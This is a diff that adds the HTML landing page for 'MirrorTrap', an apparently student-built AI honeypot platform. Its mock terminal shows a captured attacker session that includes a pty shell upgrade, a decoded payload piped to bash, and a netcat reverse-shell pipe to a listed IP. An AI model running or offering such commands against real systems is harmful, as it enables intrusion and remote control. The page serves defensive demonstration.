@@ -1,0 +1,969 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MirrorTrap — AI-Powered Honeypot Intelligence Platform</title>
+  <meta name="description" content="MirrorTrap lures, logs, and profiles cyber attackers in real time using an AI-powered honeypot. See every move they make — before they see you." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    /* ── Reset & Tokens ─────────────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:          #060a10;
+      --surface:     #0d1117;
+      --surface-2:   #111822;
+      --surface-3:   #161e2e;
+      --border:      #1a2236;
+      --border-hi:   #243050;
+      --accent:      #00f5c4;
+      --accent-dim:  rgba(0,245,196,0.10);
+      --accent-glow: rgba(0,245,196,0.28);
+      --accent-mid:  #00c99e;
+      --red:         #ff4d6d;
+      --red-dim:     rgba(255,77,109,0.14);
+      --orange:      #ff8c42;
+      --yellow:      #ffd166;
+      --purple:      #a78bfa;
+      --blue:        #60a5fa;
+      --text:        #e2eaf8;
+      --text-dim:    #6b7fa8;
+      --text-muted:  #3d4f6e;
+      --mono:        'JetBrains Mono', monospace;
+      --sans:        'Inter', sans-serif;
+      --r:           12px;
+      --r-lg:        20px;
+    }
+
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      line-height: 1.6;
+      overflow-x: hidden;
+      background-image:
+        radial-gradient(ellipse 80% 50% at 50% -10%, rgba(0,245,196,0.07) 0%, transparent 70%),
+        linear-gradient(rgba(0,245,196,0.018) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,245,196,0.018) 1px, transparent 1px);
+      background-size: 100% 100%, 44px 44px, 44px 44px;
+    }
+
+    a { color: var(--accent); text-decoration: none; }
+    img { max-width: 100%; }
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--border-hi); border-radius: 3px; }
+
+    /* ── Nav ────────────────────────────────────────────────────────────────── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 48px;
+      height: 64px;
+      background: rgba(6,10,16,0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    nav::after {
+      content: '';
+      position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
+      background: linear-gradient(90deg, transparent, var(--accent-glow), transparent);
+    }
+
+    .nav-logo {
+      display: flex; align-items: center; gap: 12px;
+      font-weight: 800; font-size: 18px; letter-spacing: -0.02em;
+      color: var(--text);
+    }
+
+    .nav-logo-icon {
+      width: 36px; height: 36px; border-radius: 9px;
+      background: linear-gradient(135deg, var(--accent), var(--accent-mid));
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 20px var(--accent-glow);
+    }
+
+    .nav-logo-icon svg { width: 18px; height: 18px; fill: #060a10; }
+
+    .nav-links { display: flex; align-items: center; gap: 32px; }
+    .nav-links a {
+      font-size: 14px; font-weight: 500; color: var(--text-dim);
+      transition: color 0.2s;
+    }
+    .nav-links a:hover { color: var(--accent); }
+
+    .nav-cta {
+      display: flex; align-items: center; gap: 6px;
+      background: var(--accent-dim); border: 1px solid rgba(0,245,196,0.3);
+      color: var(--accent) !important; border-radius: 8px;
+      padding: 8px 18px; font-weight: 700 !important; font-size: 13px !important;
+      transition: all 0.2s !important;
+    }
+    .nav-cta:hover {
+      background: rgba(0,245,196,0.18) !important;
+      box-shadow: 0 0 18px var(--accent-glow);
+    }
+
+    /* ── Hero ───────────────────────────────────────────────────────────────── */
+    .hero {
+      min-height: 100vh;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      text-align: center;
+      padding: 100px 24px 80px;
+      position: relative;
+    }
+
+    .hero-badge {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: var(--accent-dim); border: 1px solid rgba(0,245,196,0.22);
+      border-radius: 40px; padding: 6px 16px;
+      font-size: 12px; font-weight: 600; color: var(--accent);
+      letter-spacing: 0.04em; text-transform: uppercase;
+      margin-bottom: 28px;
+      animation: fadeUp 0.6s ease both;
+    }
+
+    .live-dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--accent); box-shadow: 0 0 8px var(--accent);
+      animation: blink 2s ease-in-out infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.7); }
+    }
+
+    .hero h1 {
+      font-size: clamp(44px, 7vw, 88px);
+      font-weight: 900;
+      line-height: 1.05;
+      letter-spacing: -0.04em;
+      color: var(--text);
+      max-width: 900px;
+      animation: fadeUp 0.7s 0.1s ease both;
+    }
+
+    .hero h1 .grad {
+      background: linear-gradient(135deg, var(--accent) 0%, #00d4ff 50%, var(--purple) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .hero-sub {
+      font-size: clamp(16px, 2vw, 20px);
+      color: var(--text-dim);
+      max-width: 620px;
+      margin: 28px auto 0;
+      line-height: 1.7;
+      font-weight: 400;
+      animation: fadeUp 0.7s 0.2s ease both;
+    }
+
+    .hero-actions {
+      display: flex; align-items: center; gap: 16px;
+      margin-top: 44px; flex-wrap: wrap; justify-content: center;
+      animation: fadeUp 0.7s 0.3s ease both;
+    }
+
+    .btn-primary {
+      display: inline-flex; align-items: center; gap: 9px;
+      padding: 14px 32px; border-radius: var(--r);
+      background: linear-gradient(135deg, var(--accent), var(--accent-mid));
+      color: #060a10; font-weight: 800; font-size: 15px;
+      border: none; cursor: pointer; transition: all 0.2s;
+      box-shadow: 0 0 24px var(--accent-glow), 0 4px 20px rgba(0,0,0,0.4);
+      text-decoration: none;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 40px var(--accent-glow), 0 8px 30px rgba(0,0,0,0.4);
+    }
+
+    .btn-secondary {
+      display: inline-flex; align-items: center; gap: 9px;
+      padding: 14px 28px; border-radius: var(--r);
+      background: transparent; color: var(--text);
+      font-weight: 600; font-size: 15px;
+      border: 1px solid var(--border-hi); cursor: pointer; transition: all 0.2s;
+      text-decoration: none;
+    }
+    .btn-secondary:hover {
+      border-color: var(--accent); color: var(--accent);
+      background: var(--accent-dim);
+    }
+
+    /* ── Terminal Demo ──────────────────────────────────────────────────────── */
+    .terminal-wrap {
+      margin-top: 72px;
+      max-width: 820px; width: 100%;
+      animation: fadeUp 0.8s 0.4s ease both;
+      position: relative;
+    }
+
+    .terminal-wrap::before {
+      content: '';
+      position: absolute; inset: -1px; border-radius: 18px;
+      background: linear-gradient(135deg, rgba(0,245,196,0.3), rgba(167,139,250,0.2), transparent 60%);
+      z-index: 0;
+    }
+
+    .terminal {
+      position: relative; z-index: 1;
+      background: var(--surface);
+      border: 1px solid var(--border-hi);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 32px 80px rgba(0,0,0,0.6);
+    }
+
+    .terminal-bar {
+      display: flex; align-items: center; gap: 8px;
+      padding: 12px 16px;
+      background: var(--surface-2);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .t-dot { width: 12px; height: 12px; border-radius: 50%; }
+    .t-dot.r { background: #ff5f57; }
+    .t-dot.y { background: #febc2e; }
+    .t-dot.g { background: #28c840; }
+
+    .terminal-title {
+      flex: 1; text-align: center;
+      font-family: var(--mono); font-size: 11px; color: var(--text-muted);
+    }
+
+    .terminal-body {
+      padding: 20px 24px;
+      font-family: var(--mono); font-size: 13px;
+      line-height: 1.7;
+      min-height: 260px;
+    }
+
+    .t-line { display: flex; align-items: flex-start; gap: 10px; }
+    .t-time { color: var(--text-muted); font-size: 11px; min-width: 80px; padding-top: 1px; }
+    .t-prompt { color: var(--accent-mid); font-weight: 700; }
+    .t-cmd { color: var(--text); }
+    .t-cmd.danger { color: var(--red); }
+    .t-cmd.warn { color: var(--yellow); }
+    .t-cmd.info { color: var(--accent); }
+    .t-comment { color: var(--text-muted); font-size: 11px; margin-left: 90px; font-style: italic; }
+    .t-event {
+      display: flex; align-items: center; gap: 8px;
+      color: var(--accent); font-size: 12px; margin: 6px 0;
+      opacity: 0.8;
+    }
+
+    .t-line { animation: typeIn 0.3s ease both; }
+    .t-line:nth-child(1)  { animation-delay: 0.6s; }
+    .t-line:nth-child(2)  { animation-delay: 1.0s; }
+    .t-line:nth-child(3)  { animation-delay: 1.4s; }
+    .t-line:nth-child(4)  { animation-delay: 1.8s; }
+    .t-line:nth-child(5)  { animation-delay: 2.2s; }
+    .t-line:nth-child(6)  { animation-delay: 2.6s; }
+    .t-line:nth-child(7)  { animation-delay: 3.0s; }
+    .t-line:nth-child(8)  { animation-delay: 3.4s; }
+
+    @keyframes typeIn {
+      from { opacity: 0; transform: translateX(-6px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .cursor {
+      display: inline-block; width: 8px; height: 14px;
+      background: var(--accent); border-radius: 1px;
+      animation: blink 1s step-end infinite;
+      vertical-align: middle; margin-left: 3px;
+    }
+
+    /* ── Stats Row ──────────────────────────────────────────────────────────── */
+    .stats-row {
+      display: flex; justify-content: center; gap: 48px;
+      flex-wrap: wrap;
+      padding: 16px 24px 0;
+      animation: fadeUp 0.7s 0.5s ease both;
+    }
+
+    .stat-item { text-align: center; }
+    .stat-num {
+      font-size: 36px; font-weight: 900; font-family: var(--mono);
+      background: linear-gradient(135deg, var(--accent), var(--blue));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+      line-height: 1.1;
+    }
+    .stat-label { font-size: 12px; color: var(--text-muted); font-weight: 500; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.08em; }
+
+    /* ── Section ────────────────────────────────────────────────────────────── */
+    section { padding: 100px 24px; max-width: 1100px; margin: 0 auto; }
+    .section-tag {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: var(--accent-dim); border: 1px solid rgba(0,245,196,0.2);
+      color: var(--accent); font-size: 11px; font-weight: 700;
+      text-transform: uppercase; letter-spacing: 0.1em;
+      padding: 5px 14px; border-radius: 40px; margin-bottom: 20px;
+    }
+
+    .section-title {
+      font-size: clamp(30px, 4vw, 48px);
+      font-weight: 900; letter-spacing: -0.03em;
+      line-height: 1.1; color: var(--text);
+      margin-bottom: 16px;
+    }
+
+    .section-sub {
+      font-size: 17px; color: var(--text-dim);
+      max-width: 540px; line-height: 1.7;
+    }
+
+    /* ── How It Works ───────────────────────────────────────────────────────── */
+    .steps {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 24px; margin-top: 56px;
+    }
+
+    .step-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--r-lg);
+      padding: 28px 24px;
+      position: relative;
+      transition: all 0.25s;
+      overflow: hidden;
+    }
+
+    .step-card::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0; height: 2px;
+      background: linear-gradient(90deg, var(--accent), var(--blue));
+      opacity: 0; transition: opacity 0.25s;
+    }
+
+    .step-card:hover { border-color: var(--border-hi); transform: translateY(-4px); box-shadow: 0 16px 48px rgba(0,0,0,0.4); }
+    .step-card:hover::before { opacity: 1; }
+
+    .step-num {
+      font-size: 10px; font-weight: 700; color: var(--text-muted);
+      font-family: var(--mono); letter-spacing: 0.06em;
+      text-transform: uppercase; margin-bottom: 16px;
+    }
+
+    .step-icon {
+      width: 44px; height: 44px; border-radius: 11px;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 16px; font-size: 20px;
+    }
+
+    .step-icon.teal  { background: var(--accent-dim); }
+    .step-icon.red   { background: var(--red-dim); }
+    .step-icon.blue  { background: rgba(96,165,250,0.12); }
+    .step-icon.purple{ background: rgba(167,139,250,0.12); }
+
+    .step-title { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+    .step-desc  { font-size: 13px; color: var(--text-dim); line-height: 1.65; }
+
+    /* ── Features Grid ──────────────────────────────────────────────────────── */
+    .features { margin-top: 56px; }
+
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+    }
+
+    .feature-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--r-lg);
+      padding: 28px;
+      transition: all 0.25s;
+      position: relative; overflow: hidden;
+    }
+
+    .feature-card:hover {
+      border-color: var(--border-hi);
+      box-shadow: 0 0 40px rgba(0,245,196,0.04), 0 12px 40px rgba(0,0,0,0.35);
+      transform: translateY(-3px);
+    }
+
+    .feature-icon-wrap {
+      width: 48px; height: 48px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 22px; margin-bottom: 18px;
+      border: 1px solid var(--border-hi);
+    }
+
+    .feature-title { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 10px; }
+    .feature-desc  { font-size: 13px; color: var(--text-dim); line-height: 1.7; }
+
+    /* ── Attacks Showcase ───────────────────────────────────────────────────── */
+    .attacks-grid {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 14px; margin-top: 44px;
+    }
+
+    .attack-chip {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--r);
+      padding: 16px;
+      display: flex; align-items: center; gap: 10px;
+      font-size: 13px; font-weight: 600; color: var(--text);
+      transition: all 0.2s;
+    }
+
+    .attack-chip:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+    .attack-chip .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+    .dot-red    { background: var(--red);    box-shadow: 0 0 6px var(--red); }
+    .dot-orange { background: var(--orange); box-shadow: 0 0 6px var(--orange); }
+    .dot-yellow { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+    .dot-accent { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
+    .dot-purple { background: var(--purple); box-shadow: 0 0 6px var(--purple); }
+    .dot-blue   { background: var(--blue);   box-shadow: 0 0 6px var(--blue); }
+
+    /* ── Dashboard Preview ──────────────────────────────────────────────────── */
+    .dashboard-preview {
+      background: var(--surface);
+      border: 1px solid var(--border-hi);
+      border-radius: var(--r-lg);
+      overflow: hidden;
+      margin-top: 56px;
+      box-shadow: 0 32px 80px rgba(0,0,0,0.5);
+    }
+
+    .dash-topbar {
+      padding: 12px 20px;
+      background: var(--surface-2);
+      border-bottom: 1px solid var(--border);
+      display: flex; align-items: center; gap: 12px;
+    }
+
+    .dash-title { font-weight: 800; font-size: 14px; color: var(--text); margin-right: auto; }
+    .dash-live {
+      display: flex; align-items: center; gap: 6px;
+      font-size: 10px; font-weight: 700; color: var(--accent);
+      background: var(--accent-dim); border: 1px solid rgba(0,245,196,0.2);
+      padding: 3px 10px; border-radius: 20px; text-transform: uppercase; letter-spacing: 0.07em;
+    }
+
+    .dash-body { display: grid; grid-template-columns: 220px 1fr; min-height: 300px; }
+
+    .dash-sidebar {
+      border-right: 1px solid var(--border);
+      padding: 12px;
+    }
+
+    .dash-attacker {
+      display: flex; align-items: center; gap: 8px;
+      padding: 10px 10px;
+      border-radius: 8px; margin-bottom: 4px;
+      cursor: default; transition: background 0.15s;
+      border: 1px solid transparent;
+    }
+
+    .dash-attacker.sel {
+      background: rgba(0,245,196,0.06);
+      border-color: rgba(0,245,196,0.25);
+    }
+
+    .da-avatar {
+      width: 30px; height: 30px; border-radius: 7px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; flex-shrink: 0;
+    }
+
+    .da-name { font-size: 12px; font-weight: 600; color: var(--text); }
+    .da-ip   { font-size: 10px; color: var(--text-muted); font-family: var(--mono); }
+
+    .da-pill {
+      margin-left: auto; font-size: 9px; font-weight: 700;
+      padding: 2px 7px; border-radius: 20px; text-transform: uppercase;
+    }
+
+    .pill-crit   { background: var(--red-dim);             color: var(--red);    border: 1px solid rgba(255,77,109,0.25); }
+    .pill-low    { background: var(--accent-dim);          color: var(--accent); border: 1px solid rgba(0,245,196,0.2); }
+    .pill-med    { background: rgba(255,209,102,0.12);     color: var(--yellow); border: 1px solid rgba(255,209,102,0.25); }
+
+    .dash-main { padding: 18px 20px; }
+    .dash-section-title {
+      font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em;
+      color: var(--text-muted); font-weight: 700; margin-bottom: 12px;
+    }
+
+    .mini-stat-row { display: flex; gap: 12px; margin-bottom: 18px; flex-wrap: wrap; }
+    .mini-stat {
+      background: var(--surface-2); border: 1px solid var(--border);
+      border-radius: 8px; padding: 10px 14px; min-width: 90px;
+    }
+    .ms-label { font-size: 9px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); }
+    .ms-val   { font-size: 20px; font-weight: 800; font-family: var(--mono); color: var(--accent); }
+
+    .mini-cmd-list { display: flex; flex-direction: column; gap: 4px; }
+    .mini-cmd {
+      display: flex; align-items: flex-start; gap: 8px;
+      font-family: var(--mono); font-size: 11px;
+      background: var(--surface-2); border-radius: 5px;
+      padding: 6px 10px;
+    }
+    .mc-prompt { color: var(--accent-mid); font-weight: 700; }
+    .mc-text.d { color: var(--red); }
+    .mc-text.w { color: var(--yellow); }
+    .mc-text   { color: var(--text-dim); }
+
+    /* ── Tech Stack ─────────────────────────────────────────────────────────── */
+    .tech-row {
+      display: flex; flex-wrap: wrap; gap: 12px;
+      justify-content: center; margin-top: 44px;
+    }
+
+    .tech-chip {
+      display: flex; align-items: center; gap: 8px;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 40px; padding: 10px 20px;
+      font-size: 13px; font-weight: 600; color: var(--text-dim);
+      transition: all 0.2s;
+    }
+
+    .tech-chip:hover { border-color: var(--accent); color: var(--accent); background: var(--accent-dim); }
+
+    /* ── CTA ────────────────────────────────────────────────────────────────── */
+    .cta-section {
+      text-align: center;
+      padding: 100px 24px;
+      position: relative;
+    }
+
+    .cta-section::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse 60% 60% at 50% 50%, rgba(0,245,196,0.06) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .cta-box {
+      max-width: 700px; margin: 0 auto;
+      background: var(--surface);
+      border: 1px solid var(--border-hi);
+      border-radius: 24px;
+      padding: 60px 48px;
+      position: relative;
+      box-shadow: 0 0 80px rgba(0,245,196,0.06);
+    }
+
+    .cta-box::before {
+      content: '';
+      position: absolute; top: 0; left: 50%; transform: translateX(-50%);
+      width: 200px; height: 2px;
+      background: linear-gradient(90deg, transparent, var(--accent), transparent);
+    }
+
+    .cta-box h2 {
+      font-size: clamp(28px, 4vw, 42px);
+      font-weight: 900; letter-spacing: -0.03em; color: var(--text);
+      margin-bottom: 16px;
+    }
+
+    .cta-box p {
+      font-size: 16px; color: var(--text-dim); line-height: 1.7; margin-bottom: 36px;
+    }
+
+    .cta-btns { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
+
+    /* ── Footer ─────────────────────────────────────────────────────────────── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 32px 48px;
+      display: flex; align-items: center; justify-content: space-between;
+      flex-wrap: wrap; gap: 16px;
+    }
+
+    .footer-logo {
+      display: flex; align-items: center; gap: 10px;
+      font-weight: 800; font-size: 16px; color: var(--text);
+    }
+
+    .footer-links { display: flex; gap: 24px; }
+    .footer-links a {
+      font-size: 13px; color: var(--text-muted); transition: color 0.15s;
+    }
+    .footer-links a:hover { color: var(--accent); }
+
+    .footer-copy { font-size: 12px; color: var(--text-muted); }
+
+    /* ── Animations ─────────────────────────────────────────────────────────── */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(24px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .reveal {
+      opacity: 0; transform: translateY(30px);
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+    .reveal.visible { opacity: 1; transform: translateY(0); }
+
+    /* ── Responsive ─────────────────────────────────────────────────────────── */
+    @media (max-width: 768px) {
+      nav { padding: 0 20px; }
+      .nav-links { display: none; }
+      section { padding: 60px 20px; }
+      .dash-body { grid-template-columns: 1fr; }
+      .dash-sidebar { display: none; }
+      footer { flex-direction: column; text-align: center; padding: 24px 20px; }
+      .cta-box { padding: 36px 24px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ── Nav ──────────────────────────────────────────────────────────────── -->
+  <nav>
+    <div class="nav-logo">
+      <div class="nav-logo-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+      </div>
+      MirrorTrap
+    </div>
+    <div class="nav-links">
+      <a href="#how-it-works">How It Works</a>
+      <a href="#features">Features</a>
+      <a href="#attacks">Attack Types</a>
+      <a href="#tech">Tech Stack</a>
+      <a href="https://github.com/Shrak-24/honeypot" target="_blank" class="nav-cta">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+        GitHub
+      </a>
+    </div>
+  </nav>
+
+  <!-- ── Hero ─────────────────────────────────────────────────────────────── -->
+  <section class="hero">
+    <div class="hero-badge">
+      <div class="live-dot"></div>
+      Honeypot Intelligence · Real-Time Threat Detection
+    </div>
+
+    <h1>
+      Every attacker<br/>
+      leaves a <span class="grad">mirror</span>
+    </h1>
+
+    <p class="hero-sub">
+      MirrorTrap is an AI-powered honeypot platform that lures, logs, and
+      profiles cyber attackers in real time — giving you the intelligence
+      edge before they strike.
+    </p>
+
+    <div class="hero-actions">
+      <a href="https://github.com/Shrak-24/honeypot" target="_blank" class="btn-primary">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+        View on GitHub
+      </a>
+      <a href="#how-it-works" class="btn-secondary">
+        See How It Works ↓
+      </a>
+    </div>
+
+    <!-- Terminal -->
+    <div class="terminal-wrap">
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="t-dot r"></div>
+          <div class="t-dot y"></div>
+          <div class="t-dot g"></div>
+          <div class="terminal-title">mirrortrap — honeypot session capture</div>
+        </div>
+        <div class="terminal-body">
+          <div class="t-event">⚡ New SSH connection: 162.55.196.130 → Attacker 7 connected</div>
+          <div class="t-line">
+            <span class="t-time">20:14:03</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd info">whoami &amp;&amp; id</span>
+          </div>
+          <div class="t-line">
+            <span class="t-time">20:14:07</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd">cat /proc/version &amp;&amp; ip route</span>
+          </div>
+          <div class="t-line">
+            <span class="t-time">20:14:11</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd warn">find /var /etc /home -mtime -1 2&gt;/dev/null</span>
+          </div>
+          <div class="t-line">
+            <span class="t-time">20:14:18</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd danger">python3 -c "import pty; pty.spawn('/bin/bash')"</span>
+          </div>
+          <div class="t-line">
+            <span class="t-time">20:14:22</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd danger">base64 -d /tmp/.payload | bash</span>
+          </div>
+          <div class="t-line">
+            <span class="t-time">20:14:26</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd danger">mkfifo /tmp/pipes &amp;&amp; cat /tmp/pipes | nc 162.55.196.130 4444</span>
+          </div>
+          <div class="t-event" style="color:var(--red)">🔴 ALERT: Auth breach detected — AI profiling initiated</div>
+          <div class="t-line">
+            <span class="t-time">20:14:31</span>
+            <span class="t-prompt">$</span>
+            <span class="t-cmd" style="color:var(--text-muted)"><span class="cursor"></span></span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-item">
+        <div class="stat-num">10+</div>
+        <div class="stat-label">Attacker Profiles</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">12</div>
+        <div class="stat-label">Attack Types Detected</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">AI</div>
+        <div class="stat-label">Powered by Gemini</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-num">RT</div>
+        <div class="stat-label">Real-Time Dashboard</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── How It Works ──────────────────────────────────────────────────────── -->
+  <section id="how-it-works">
+    <div class="reveal">
+      <div class="section-tag">🔍 How It Works</div>
+      <h2 class="section-title">Trap, track &amp; analyze<br/>in four steps</h2>
+      <p class="section-sub">MirrorTrap silently mimics vulnerable services to attract real attackers, then captures everything they do.</p>
+    </div>
+
+    <div class="steps reveal">
+      <div class="step-card">
+        <div class="step-num">Step 01</div>
+        <div class="step-icon teal">🪤</div>
+        <div class="step-title">Lure</div>
+        <div class="step-desc">Deploy fake SSH, HTTP and API endpoints that look like real production services. Attackers can't resist.</div>
+      </div>
+      <div class="step-card">
+        <div class="step-num">Step 02</div>
+        <div class="step-icon red">📡</div>
+        <div class="step-title">Capture</div>
+        <div class="step-desc">Every command, credential attempt, HTTP request and payload is silently logged with timestamps and session metadata.</div>
+      </div>
+      <div class="step-card">
+        <div class="step-num">Step 03</div>
+        <div class="step-icon blue">🧠</div>
+        <div class="step-title">Profile</div>
+        <div class="step-desc">Gemini AI analyzes each attacker's behaviour — classifying skill level, tools used, intent, and attack type.</div>
+      </div>
+      <div class="step-card">
+        <div class="step-num">Step 04</div>
+        <div class="step-icon purple">📊</div>
+        <div class="step-title">Visualize</div>
+        <div class="step-desc">A live SOC-style dashboard shows every attacker, their session timeline, command history and threat intelligence in real time.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── Dashboard Preview ─────────────────────────────────────────────────── -->
+  <section style="padding-top:0">
+    <div class="reveal">
+      <div class="section-tag">🖥️ Live Dashboard</div>
+      <h2 class="section-title">SOC-grade visibility<br/>in your browser</h2>
+    </div>
+
+    <div class="dashboard-preview reveal">
+      <div class="dash-topbar">
+        <div style="width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--accent-mid));display:flex;align-items:center;justify-content:center;">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#060a10"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        </div>
+        <div class="dash-title">MirrorTrap</div>
+        <div class="dash-live"><div class="live-dot"></div>LIVE</div>
+        <div style="font-size:12px;color:var(--text-muted);font-family:var(--mono)">10 sessions · 34 attacks</div>
+      </div>
+      <div class="dash-body">
+        <div class="dash-sidebar">
+          <div class="dash-attacker sel">
+            <div class="da-avatar" style="background:var(--red-dim);color:var(--red)">💀</div>
+            <div><div class="da-name">Attacker 7</div><div class="da-ip">162.55.196.130</div></div>
+            <div class="da-pill pill-crit">AUTH</div>
+          </div>
+          <div class="dash-attacker">
+            <div class="da-avatar" style="background:var(--accent-dim);color:var(--accent)">👤</div>
+            <div><div class="da-name">Attacker 1</div><div class="da-ip">185.220.101.42</div></div>
+            <div class="da-pill pill-low">Low</div>
+          </div>
+          <div class="dash-attacker">
+            <div class="da-avatar" style="background:rgba(255,209,102,0.12);color:var(--yellow)">👤</div>
+            <div><div class="da-name">Attacker 6</div><div class="da-ip">5.188.86.172</div></div>
+            <div class="da-pill pill-med">Med</div>
+          </div>
+          <div class="dash-attacker">
+            <div class="da-avatar" style="background:var(--red-dim);color:var(--red)">💀</div>
+            <div><div class="da-name">Attacker 9</div><div class="da-ip">192.168.10.55</div></div>
+            <div class="da-pill pill-crit">AUTH</div>
